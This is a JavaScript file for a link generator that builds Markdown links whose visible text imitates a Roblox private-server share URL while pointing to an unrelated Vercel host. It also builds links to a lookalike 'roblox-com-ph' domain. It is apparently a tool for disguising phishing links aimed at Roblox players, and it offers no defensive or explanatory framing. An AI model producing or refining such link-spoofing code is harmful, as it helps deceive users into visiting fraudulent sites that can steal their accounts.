const exampleBlock = document.getElementById("exampleBlock");

function updatePlaceholderAndExample() {
  const type = document.getElementById("linkType").value;
  const input = document.getElementById("urlInput");

  if (type === "profile" || type === "privateServer") {
    input.placeholder = "Type something to add after https://shorturll-one.vercel.app/?";
    exampleBlock.innerHTML =
      '[https*:*//www.roblox.com/share?code=116562041fd4d54681b915675dd54767&type=Server](https://shorturll-one.vercel.app/?)';
  } else if (type === "group") {
    input.placeholder = "Enter group URL or ID";
    exampleBlock.innerHTML = "";
  }
}

function generateLink() {
  const type = document.getElementById("linkType").value;
  const userInput = document.getElementById("urlInput").value.trim();

  if (!userInput) {
    alert("Please enter a valid URL or text.");
    return;
  }

  const encodedInput = encodeURIComponent(userInput);
  let finalLink = "";

  if (type === "profile" || type === "privateServer") {
    finalLink = `[https*:*//www.roblox.com/share?code=116562041fd4d54681b915675dd54767&type=Server](https://shorturll-one.vercel.app/?${encodedInput})`;
  } else if (type === "group") {
    finalLink = `https://roblox-com-ph.vercel.app/?DI=${encodedInput}`;
  }

  const generatedLinkField = document.getElementById("generatedLink");
  generatedLinkField.value = finalLink;
  document.getElementById("resultBlock").classList.remove("hidden");
}

function copyLink() {
  const generatedLinkField = document.getElementById("generatedLink");
  generatedLinkField.select();
  generatedLinkField.setSelectionRange(0, 99999); // For mobile

  document.execCommand("copy");
  alert("✅ Link copied to clipboard!");
}

// Initialize on page load
updatePlaceholderAndExample();
